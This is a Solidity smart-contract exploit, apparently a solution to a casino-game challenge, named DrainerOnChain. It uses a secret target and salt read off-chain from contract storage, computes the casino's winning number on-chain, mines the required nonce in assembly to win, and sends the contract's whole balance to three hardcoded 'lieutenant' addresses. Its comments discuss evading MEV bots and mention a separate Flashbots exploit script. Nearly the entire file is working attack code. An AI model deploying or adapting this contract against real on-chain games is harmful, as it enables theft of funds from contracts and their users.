// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IFairCasino {
    function play(uint256 guess, uint256 round, uint256 nonce) external payable;
    function currentRound() external view returns (uint256);
    function priceOracle() external view returns (address);
}

interface AggregatorV3Interface {
    function latestRoundData() external view returns (
        uint80, int256, uint256, uint256, uint80
    );
}

/// @title DrainerOnChain
/// @notice Implements IDrainer but computes the winning number inside the EVM —
///         the nonce never appears in calldata.
///
/// @dev secretTarget and gameSalt are passed in the constructor (obtained off-chain
///      via eth_getStorageAt slot 5 and creation-tx decoding). The attack() parameter
///      is intentionally ignored: the winning number is derived at call time from the
///      live oracle price and currentRound, making it impossible for the MEV bot to
///      steal the nonce from calldata.
///
///      WHY IT STILL FAILS:
///      The MEV bot doesn't need the nonce from calldata — it independently
///      computes the same winning number the moment it sees any attack() call pending.
///      The only reliable bypass is Flashbots Protect (see flashbots-exploit.js).
contract DrainerOnChain {

    error RoundMismatch(uint256 expected, uint256 actual);

    IFairCasino public immutable casino;
    uint256 private immutable secretTarget;
    uint256 private immutable gameSalt;

    // ── Lieutenants ────────────────────────────────────────────────────────────
    address public constant LT1 = 0xf520cEd3b7FdA050a3A44486C160BEAb15ED3285; // 50%
    address public constant LT2 = 0x334Bdaad35afD9133B2CE6F8259F3dBAc56D95e1; // 30%
    address public constant LT3 = 0xbE99BCD0D8FdE76246eaE82AD5eF4A56b42c6B7d; // 20%

    constructor(address _casino, uint256 _secretTarget, uint256 _gameSalt) payable {
        casino       = IFairCasino(_casino);
        secretTarget = _secretTarget;
        gameSalt     = _gameSalt;
    }

    // ─── IDrainer interface ────────────────────────────────────────────────────

    /// @notice _guess and _nonce are ignored — winning number and nonce computed on-chain.
    function attack(uint256, uint256 _round, uint256) external payable {
        address oracleAddr = casino.priceOracle();
        (, int256 price,,,) = AggregatorV3Interface(oracleAddr).latestRoundData();
        uint256 currentRound = casino.currentRound();
        if (_round != currentRound) revert RoundMismatch(currentRound, _round);

        uint256 winningNumber = uint256(keccak256(
            abi.encodePacked(
                secretTarget ^ uint256(price),
                gameSalt,
                currentRound
            )
        ));

        uint256 nonce = _mineNonce(winningNumber, currentRound);
        require(nonce != 0, "failed to mine nonce");

        casino.play{value: 0.01 ether}(winningNumber, currentRound, nonce);
        distribute();
    }

    // Assembly-optimised nonce mining: avoids abi.encodePacked overhead, writes
    // the 116-byte packed input [addr(20)|nonce(32)|winningNumber(32)|round(32)]
    // once and only updates the 32-byte nonce slot each iteration.
    function _mineNonce(uint256 winningNumber, uint256 round) internal view returns (uint256 result) {
        assembly {
            let ptr := mload(0x40)
            // addr packed at ptr[0..19]: shl(96, addr) puts 20-byte addr in top 20 bytes
            mstore(ptr, shl(96, address()))
            // winningNumber at ptr[52..83], round at ptr[84..115] (static — written once)
            mstore(add(ptr, 52), winningNumber)
            mstore(add(ptr, 84), round)

            let found := 0
            let n     := 0
            for { } and(lt(n, 200000), iszero(found)) { } {
                mstore(add(ptr, 20), n)               // nonce at ptr[20..51]
                let h := keccak256(ptr, 116)          // 30 + 6*ceil(116/32) = 54 gas
                if eq(and(h, 0xffff), 0xbeef) {
                    result := n
                    found  := 1
                }
                n := add(n, 1)
            }
        }
    }

    /// @notice Distribute entire balance: LT1=50%, LT2=30%, LT3=20%.
    function distribute() public {
        uint256 total = address(this).balance;
        (bool ok1,) = payable(LT1).call{value: total * 50 / 100}("");
        (bool ok2,) = payable(LT2).call{value: total * 30 / 100}("");
        (bool ok3,) = payable(LT3).call{value: address(this).balance}("");
        require(ok1 && ok2 && ok3, "distribute failed");
    }

    receive() external payable {}
}
